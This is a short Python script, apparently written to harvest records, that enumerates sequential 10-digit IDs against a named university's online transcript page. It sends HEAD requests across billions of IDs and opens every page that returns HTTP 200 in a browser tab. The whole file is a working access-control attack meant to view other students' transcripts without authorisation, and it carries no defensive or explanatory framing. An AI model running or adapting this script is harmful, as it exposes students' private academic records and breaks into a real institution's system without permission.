import requests
import webbrowser

url="https://nucleus.niituniversity.in/OnlineTranscript.aspx?id="
uu=''
nu=0

for i in range(6794115643,9999999999):
	nu=format(i, '010d')
	uu=url+nu
	response = requests.head(uu)
	print(uu)
	print(response)
	if(int(response.status_code)==200):
		webbrowser.open_new_tab(uu)